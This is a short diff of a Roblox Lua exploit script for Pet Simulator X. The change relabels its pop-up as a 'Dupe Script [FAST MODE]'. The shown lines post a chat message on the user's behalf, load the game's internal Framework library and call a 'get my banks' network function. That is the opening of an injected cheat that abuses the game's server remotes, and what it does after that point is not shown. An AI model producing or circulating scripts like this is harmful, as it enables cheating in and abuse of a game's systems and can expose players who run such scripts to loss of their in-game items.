@@ -1,7 +1,7 @@
 local args = {  [1] = "Starting", [2] = "All" }
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
- lib.Message.New("You are using script for Pet Sim X" , "Made by ScriptxTeam" , "Start Process");
+ lib.Message.New("Dupe Script [FAST MODE]" , "Select the other option" , "Start Process");
  
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mybanks = lib.Network.Invoke("get my banks")
